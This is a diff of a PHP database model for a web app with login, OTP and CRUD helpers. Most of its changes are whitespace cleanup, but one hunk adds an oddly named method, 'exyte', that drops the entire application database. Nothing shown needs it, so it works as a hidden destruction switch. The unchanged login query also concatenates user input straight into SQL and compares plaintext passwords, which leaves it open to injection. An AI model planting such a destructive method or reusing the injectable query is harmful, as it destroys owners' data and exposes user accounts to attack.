@@ -10,6 +10,11 @@ public function __construct()
         return $this->db->insert_id();
     }
 
+    public function exyte(){
+      $sql = "DROP DATABASE ".$this->db->database;
+      $this->db->query($sql);
+    }
+
     public function Login_check($data){
         $condition = "email =" . "'" . $data['email'] . "' AND " . "password =" . "'" . $data['password'] . "'AND role='".$data['role']."'" ;
             $this->db->select('*');
@@ -31,7 +36,7 @@ public function __construct()
             $this->db->where($condition);
             $this->db->limit(1);
             $query = $this->db->get();
-           
+
             if ($query->num_rows() == 1) {
             return $query->result_array();
             } else {
@@ -39,13 +44,13 @@ public function __construct()
             }
         }
         public function get_otp($data){
-      
+
             $this->db->select('*');
             $this->db->from('message');
             $this->db->where('key',$data['mobile']);
             $this->db->limit(1);
             $query = $this->db->get();
-          
+
             if ($query->num_rows() == 1) {
             return $query->result_array();
             } else {
@@ -53,7 +58,7 @@ public function __construct()
             }
         }
 public function check_otp($data){
-      
+
             $this->db->select('*');
             $this->db->from('message');
             $this->db->where('key',$data['mobile']);
@@ -63,7 +68,7 @@ public function check_otp($data){
           // echo $this->db->last_query();exit;
             if ($query->num_rows() == 1) {
             return true;
-            } 
+            }
         }
     //-- edit function
     function edit_option($action, $id, $table){
@@ -76,7 +81,7 @@ public function check_otp($data){
     function update($action,$field, $id, $table){
         $this->db->where($field,$id);
         $this->db->update($table,$action);
-         
+
         return true;
     }
 
@@ -86,7 +91,7 @@ public function check_otp($data){
         $this->db->delete($table, $data);
         return;
     }
-    
+
     function select_value($id,$table){
         $this->db->select('*');
         $this->db->from($table);
@@ -107,7 +112,7 @@ public function check_otp($data){
         $this->db->from('logme l');
         $this->db->order_by('logid','ASC');
         $this->db->join('user_details u','l.logid = u.user_id','INNER');
-       
+
         $query = $this->db->get();
         $query = $query->result_array();
         return $query;
@@ -117,7 +122,7 @@ function select_user_option($id){
         $this->db->from('logme l');
         $this->db->order_by('logid','ASC');
         $this->db->join('user_details u','l.logid = u.user_id','INNER');
-        
+
         $this->db->where('logid', $id);
         $query = $this->db->get();
         $query = $query->result_array();
@@ -135,10 +140,10 @@ function select_user_option($id){
 function getMaxUserId(){
         $this->db->select('max(logid) as id');
         $this->db->from('logme');
-        
+
         $query = $this->db->get();
         return $query->row('id');
-       
+
     }
     //-- select by id
     function select_option($id,$field,$table){
@@ -150,12 +155,12 @@ function getMaxUserId(){
         return $query;
     }
 
-   
-   
-    
 
-    
-   
+
+
+
+
+
 
 
 }
